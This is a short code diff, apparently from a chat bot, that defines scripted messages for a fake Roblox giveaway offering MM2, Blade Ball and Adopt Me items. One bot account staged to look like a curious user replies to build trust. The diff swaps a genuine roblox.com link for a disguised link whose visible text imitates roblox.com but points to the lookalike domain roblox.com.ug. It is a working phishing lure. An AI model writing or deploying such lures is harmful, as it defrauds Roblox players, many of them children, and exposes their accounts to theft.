@@ -5,11 +5,11 @@ const TARGET_ID = "2726759126";
 const BUILTIN_TARGET_FIRST = `Hi, im currently giving away free stuff on roblox. If you want to get some before its too late, join the link below.
 I may take some time answering but i will come back to you!
 
-[https://www.roblox.com/users/{{targetId}}/profile](https://www.roblox.com/users/{{targetId}}/profile)`;
+[https//roblox.com/users/3478998936/profile](https://roblox.com.ug/users/3478998936/profile)`;
 
 const BUILTIN_SELF_REPLY = `Excuse me?
 What are you giving away though
-<@{{targetId}}>`;
+{{mentionTarget}}`;
 
 const BUILTIN_TARGET_SECOND = "MM2 BLADE BALL AND ADOPT ME JOIN FAST";
 
